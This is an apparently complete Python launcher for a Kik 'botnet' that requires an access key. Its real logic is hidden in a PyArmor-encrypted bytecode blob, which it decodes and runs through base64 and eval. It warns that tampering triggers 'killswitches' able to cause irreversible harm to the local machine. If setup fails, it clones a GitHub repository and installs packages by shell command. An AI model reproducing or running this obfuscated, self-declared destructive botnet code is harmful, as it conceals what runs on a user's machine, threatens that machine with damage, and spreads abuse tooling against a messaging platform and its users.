'''
YOU MUST GET AN ACCESS KEY FOR YOUR BOTNET TO WORK. YOU CAN GET A FREE KEY FROM STETHO.
'''
print("\nWARNING: This code contains anti-tampering killswitches that can cause irreversable harm to a local machine if triggered, do NOT tamper with this bot's code!\n(For all disclaimers, visit pastebin.com/zRUVXuKL)\n")
input("Press enter to acknowledge this warning and continue:")
import base64
import sys
import subprocess
import os
import time
from pytransform import pyarmor_runtime
pyarmor_runtime()
__pyarmor__(__name__, __file__, b'\x50\x59\x41\x52\x4d\x4f\x52\x00\x00\x03\x08\x00\x55\x0d\x0d\x0a\x07\x2c\xa0\x01\x00\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00\xb1\x02\x00\x00\x00\x00\x00\x08\x2e\xe1\xd6\xd1\xe8\xf3\xbb\x5d\xb0\x3e\x58\x29\xf8\x1e\x37\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x93\x2e\x9a\x1b\x62\x3c\x70\x80\x78\x70\xa7\xce\xca\x4a\x60\xda\xce\xc6\x65\xdc\x69\x6e\x31\xe1\x49\x7c\xcc\xd1\x50\xae\xe8\xf1\x76\xce\xfa\x83\x4f\xdf\x13\xda\x11\xf5\xf5\xad\x10\xf5\xc2\x9f\x93\x23\x05\x5f\xbd\x2e\xc9\x9d\xc1\xd3\x24\x32\xa9\xae\x7e\xfe\x09\x46\x49\x94\xf9\x14\x85\x4c\x93\xeb\xd1\x3b\x41\x0b\x8f\x05\x7d\x24\x8c\x34\xbb\x5a\x19\xca\x61\xce\xb8\x2b\x09\x13\x65\x43\xe4\x64\xd4\x37\x04\x06\xa3\x83\xcb\xdf\xb7\x42\xd4\x0b\x03\xfc\xb4\xbc\x16\x57\xce\x2a\x84\x40\xcb\x84\x33\x00\xad\x3c\xcb\xd4\xc7\x27\x80\xdc\x48\x11\xcf\x4e\xeb\x4f\x97\x3b\x4e\x74\x4c\xc4\x6b\x20\x26\xb0\xed\x96\xd4\x51\x32\x86\xca\x67\x6c\x66\x28\x81\xfb\x41\x27\x1c\x8b\x92\x3f\xf4\xcd\x5b\x03\x69\x40\x93\x7f\x4a\x83\x21\x2d\x12\xec\x56\x0c\x4d\x9d\xaa\xeb\xd7\x65\x6b\x68\x4f\xed\xb8\xc0\xe9\x0a\xaf\x19\xc0\x67\x25\x37\x5e\xd9\xd2\xb0\x3a\xe8\x92\xc3\x35\x54\xcb\xf0\xd3\xc0\x3f\x9b\x73\x5e\xac\x2c\xde\x3a\x6b\x36\xe2\xf4\xe8\xff\x05\xb1\x2a\xd1\xc1\xce\x32\xa9\x56\x0b\xeb\x81\x07\x34\x04\x89\x6c\x75\x20\xb9\xcb\xbb\xac\x61\xb0\xb2\xf8\xe9\x37\x58\x7b\xac\xd5\xef\x20\x61\xcc\x6f\x27\xf7\xa2\x01\x4d\x9e\x44\x56\x0b\x08\x9b\x2e\x42\xc5\x5a\xe3\x2c\x66\xfb\x5a\x91\x0b\x3d\x33\xb8\xf2\xee\x0b\x27\x9e\x0e\x13\x95\xd9\x9b\xb4\x5c\x2c\x30\xf1\xb5\x35\xc2\x87\xb1\x2a\xa0\x68\xb8\x6f\x8a\xf3\xa4\x56\x4d\x71\x21\x6e\xc6\x2d\xbb\xeb\x65\x32\x34\x16\x1c\xb2\x6e\x83\x2c\xe7\xee\xed\xb4\x00\x59\x90\xac\x64\x50\x27\x84\x76\xc2\x81\xcc\x6d\xb1\x90\x59\x33\x81\x3b\xed\x7c\xaf\x78\xe0\x32\x39\x23\xcd\xf3\x97\xab\x3d\x9a\x8d\x85\x32\x79\x09\x5a\x2d\xc9\x7f\x6f\xb8\x02\x9b\x4f\x45\x00\xd7\x09\xa8\xb5\xec\xb8\x20\x17\xb8\xb8\xe8\x72\x31\x0b\x5d\x21\x52\xce\x91\x44\x59\x6e\xe8\xbf\x92\xc8\x6a\xd6\x01\x21\x84\xbe\x1c\xd3\xfd\xf9\x79\x7b\x38\x0e\x61\x43\x94\xe7\x82\xda\xc7\x2f\xd7\x4f\x68\x85\x22\x78\x4f\xc0\x06\x9f\xf8\x1b\x20\x9d\xba\x2d\xf1\xfe\xf3\xa4\x11\xcc\x93\x6a\xaf\x72\xa2\x76\x8b\x52\xc9\x4b\xa7\x4f\xfc\x83\xe3\x26\xc3\xce\x70\x23\x62\xf1\x63\x04\x52\x80\xec\xc3\x5d\xb7\xb7\x54\x7a\x16\xaf\x73\x7e\x14\x56\xcd\x0d\x20\x38\x19\x94\xbe\x99\x1b\xf8\x2d\xfc\xa2\xc0\xf5\xf8\x01\x55\x3d\xb5\x4c\xea\x45\x9f\x3a\xdd\xf2\x43\xb2\x7c\x14\x20\x11\xb2\x43\x8b\xa8\x1d\xbc\x2a\x96\x35\xbd\xf2\x98\x6a\x3c\x80\x7f\xd0\x87\x0c\xb4\x7f\x0f\x2c\x60\xda\x84\xe1\xbd\xb0\xfb\xa7\xfa\xd0\xc7\x2a\x04\x30\x41\xbe\xda\x26\xf7\xb3\x04\x4b\x3b\x52\x4c\x4d\x06\x21\x33\x68\x64\xb7\x95\x03\x34\x5c\xee\x28\x8e\x16\xb1\x8f\xb3\xce\xf2\x99\x75\xa6\x21\x7d\x1f\x10\xae\x8c\x8a\xac\x52\xdc\x7f\x05\x96\x78\x21\xbc\x03\x93\xac\xec\x51\xc7\xa9\xda\xc4\x8f\x34\x5b\x09\xf6\x3f\x1f\xca\xf1\x15\x63\xd6\x01\xf1\x4a\x88\x12\x9a\x3e\x9d\xdb\xe7\xc0\x40\x04\x8c\x49\xfa\x94\x6f\xb6\xdd\xc3\x6a\xe8\x4a\x94\xbf\xbc\x52\x26\x38\x0c\x2e\xc4\xfb\xd7\x3d\x86\x33\x00\xcc\x22\xb5\xd0\x86\xbd\x56', 2)
try:
  print("\nBooting up...\n")
  run = base64.b64decode(skid)
  eval(compile(run,'<string>','exec'))
except ModuleNotFoundError:
  print("Oh, it looks like some things need to be set up real quick! I'll take care of that for you.\n")
  time.sleep(1)
  print("Please wait...\n")
  time.sleep(2)
  os.system('git clone -b new https://github.com/StethoSaysHello/kik-bot-api-unofficial')
  os.system('pip3 install ./kik-bot-api-unofficial')
  def install(package):
      subprocess.check_call([sys.executable, "-m", "pip", "install", package])
  install('emoji')
  install('colorama')
  install('pbwrap')
  install('speedtest')
  install('kik_unofficial')
  print("\nI'm done installing everything you need, I'll start the botnet for you now.")
  time.sleep(1)
  print("Booting up...\n")
  run = base64.b64decode(skid)
  eval(compile(run,'<string>','exec'))
